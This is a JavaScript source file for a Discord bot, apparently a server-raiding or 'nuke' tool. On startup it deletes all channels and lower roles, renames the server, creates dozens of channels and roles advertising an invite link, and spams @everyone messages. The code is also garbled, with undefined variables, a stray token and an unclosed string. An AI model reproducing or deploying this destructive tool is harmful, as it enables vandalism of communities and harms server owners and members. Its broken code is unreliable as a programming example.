const Discord = require('discord.js');
const client = new Discord.Client();
const config = require('./config.json');

client.on('ready', () => {
    console.log('started');
    });


client.once('ready', () => {
    const guild = client.guilds.cache.get(config.sunucuid);

    // change server photo
    guild.setIcon("./caner.jpg")
        .then(updatedGuild => {
            console.log('server photo changed.');
        })
        .catch(console.error);

    // Change Server Name
    guild.setName('hi')
        .then(updatedGuild => {
            console.log('server name changed.');
        })
        .catch(console.error);
});

client.on('ready', () => {
    const guild = client.guilds.cache.get(config.sunucuid);
    if (!guild) {
      console.log('server not found');
      return;
    }
    guild.channels.cache.forEach((channel) => channel.delete());
    
    const botRolePosition = guild.me.roles.highest.position;
    
    guild.roles.cache.forEach((role) => {
      if (role.name !== '@everyone' && role !== guild.me.roles.highest && role.position < botRolePosition) {
        role.delete().catch(error => {
          console.error(`role could not be deleted:   ${role.name}`, error);
        });
      }
    });
    
    guild.fetchAuditLogs({ type: 'GUILD_UPDATE' }).then((audit) => {
      const entry = audit.entries.first();
      if (!entry) {
        console.log('update history not found');
        return;
      }
      const deleteOptions = {
        reason: 'the server is reset..',
        days: 7
      };
      guild.edit({
        name: 'new server',
        icon: null,
        splash: null,
        region: 'europe'
      }).then(() => {
        guild.roles.create({
          name: 'Üye',
          color: 'RANDOM',
          permissions: ['SEND_MESSAGES', 'READ_MESSAGE_HISTORY']
        });
      });
    });
  });
  



  client.once('ready', () => {
    const guild = client.guilds.cache.get(config.sunucuid);

    const categoryData = [
        {
            name: 'hi',
            channelTexts: ['caner', 'frangelss', 'emrullah', 'pegavulin', 'mephisto', 'nidhogg', 'arya']
        },
        {
            name: '/isid',
            channelTexts: ['isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid',  'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid', 'isid']
        },
        {
            name: 'we',
            channelTexts: ['gun', 'gelir', 'ihanet', 'eden', 'sadakat', 'ister']
        }
        // Eklemek istediğiniz kategori adlarını ve metinleri buraya ekleyin
    ];

    const repeatCount = 8; // İşlemin kaç kez tekrarlanacağını belirleyin

    function createChannels() {
        for (let i = 0; i < repeatCount; i++) {
            setTimeout(() => {
                categoryData.forEach(category => {
                    guild.channels.create(category.name, {
                        type: 'category'
                    })
                        .then(createdCategory => {
                            for (let j = 0; j < category.channelTexts.length; j++) {
                                const channelName = category.channelTexts[caner-ve-dostlari]; // Kanal ismini burada belirleyin
                                const channelText = category.channelTexts[qwerty]; // Kategoriye göre metni belirleyin

                                guild.channels.create(channelName, {
                                    type: 'voice',
                                    parent: createdCategory.id
                                })
                                    .then(channel => {
                                        channel.edit({
                                            topic: channelText
                                        });
                                        const num = (i * category.channelTexts.length) + j + 1;
                                        console.log(`${num}. audio channel created.:   ${channelName}`);
                                    })
                                    .catch(console.error);
                            }
                        })
                        .catch(console.error);
                });
            }, i * 5000); // Her bir tekrar arasında 5 saniye bekletme
        }
    }

    createChannels();
});


client.once('ready', () => {
    const guild = client.guilds.cache.get(config.sunucuid);
    
    const roleData = [
        {
            name: 'caner',
            color: 'BLUE',
            permissions: ['MANAGE_MESSAGES', 'KICK_MEMBERS', 'BAN_MEMBERS']
        },
        {
            name: 'emrullah',
            color: 'GREEN',
            permissions: ['SEND_MESSAGES', 'READ_MESSAGE_HISTORY']
        },
        {
            name: 'Athenax#2387',
            color: 'GRAY',
            permissions: ['SEND_MESSAGES']
        },
        {

            name: 'frangless',
            color: 'GREEN',
            permissions: ['READ_MESSAGE_HISTORY']
        },
        {
            name: 'pegavulin',
            color: 'RED',
            permissions: ['KICK_MEMBERS']
        },
        {
            name: 'mephisto',
            color: 'RED',
            permissions: ['KICK_MEMBERS']
        },
                {
            name: 'nidhogg',
            color: 'RED',
            permissions: ['KICK_MEMBERS']
        },
        {
            name: 'discord.gg/isid',
            color: 'RED',
            permissions: ['KICK_MEMBERS']
        },
        {
            name: 'discord.gg/isid',
            color: 'GOLD',
            permissions: ['KICK_MEMBERS']
        },
        {
            name: 'discord.gg/isid',
            color: 'GOLD',
            permissions: ['KICK_MEMBERS']
        },
        {
            name: 'discord.gg/isid',
            color: 'GOLD',
            permissions: ['KICK_MEMBERS']
        },
        {
            name: 'discord.gg/isid',
            color: 'GOLD',
            permissions: ['KICK_MEMBERS']
        },
        {vd
            name: 'discord.gg/isid',
            color: 'RED',
            permissions: ['KICK_MEMBERS']
        },
        {
            name: 'discord.gg/isid',
            color: 'RED',
            permissions: ['KICK_MEMBERS']
        },
        {
            name: 'discord.gg/isid',
            color: 'GOLD',
            permissions: ['KICK_MEMBERS']
        },
        {
            name: 'discord.gg/isid',
            color: 'GOLD',
            permissions: ['KICK_MEMBERS']
        },
        {
            name: 'discord.gg/isid',
            color: 'GOLD',
            permissions: ['KICK_MEMBERS']
        },

    ];

    const repeatCount = 10; // İşlemin kaç kez tekrarlanacağını belirleyin

    function createRoles() {
        for (let i = 0; i < repeatCount; i++) {
            setTimeout(() => {
                roleData.forEach(role => {
                    guild.roles.create({
                        data: {
                            name: role.name,
                            color: role.color,
                            permissions: role.permissions
                        }
                    })
                    .then(createdRole => {
                        console.log(`roles are created.:   ${createdRole.name}`);
                    })
                    .catch(console.error);
                });
            }, i * 2000); // Her bir tekrar arasında 5 saniye bekletme
        }
    }

    createRoles();
});

client.once('ready', () => {
    const guild = client.guilds.cache.get(config.sunucuid);
    const channelNames = ['caner-ve-dostlari-ugradi]; // Kanal adlarını burada belirleyin

    function createChannels() {
        const createdChannels = [];

        // Kanalları oluştur
        for (let i = 0; i < channelNames.length; i++) {
            guild.channels.create(channelNames[i], { type: 'text' })
                .then(channel => {
                    createdChannels.push(channel);

                    if (channel.name === 'cocuk') {
                        channel.updateOverwrite(guild.roles.everyone, { SEND_MESSAGES: true }) // Yazma iznini true olarak güncelle
                            .then(() => {
                                console.log(`"${channel.name}" kanalı oluşturuldu ve yazma izni etkinleştirildi.`);

                                // Duyuru kanalına mesaj gönder
                                channel.send('Hi caner ve dostları discord.gg/isid ||@everyone||');
                                channel.send('Hi caner ve dostları discord.gg/isid ||@everyone||');
                                channel.send('Hi caner ve dostları discord.gg/isid ||@everyone||');
                                channel.send('Hi caner ve dostları discord.gg/isid ||@everyone||');
                                channel.send('Hi caner ve dostları discord.gg/isid ||@everyone||');
                                channel.send('Hi caner ve dostları discord.gg/isid ||@everyone||');
                                channel.send('Hi caner ve dostları discord.gg/isid ||@everyone||');
                                channel.send('Hi caner ve dostları discord.gg/isid ||@everyone||');
                                channel.send('Hi caner ve dostları discord.gg/isid ||@everyone||');
                                channel.send('Hi caner ve dostları discord.gg/isid ||@everyone||');
                            })
                            .catch(console.error);
                    } else {
                        console.log(`"${channel.name}" channel created.`);
                    }

                    if (createdChannels.length === 2) {
                        guild.setChannelPositions([{ channel: createdChannels[0].id, position: 0 }, { channel: createdChannels[1].id, position: 1 }])
                            .then(() => {
                                console.log('channel order updated.');
                            })
                            .catch(console.error);
                    }
                })
                .catch(console.error);
        }
    }

    createChannels();
});




client.login(config.token)
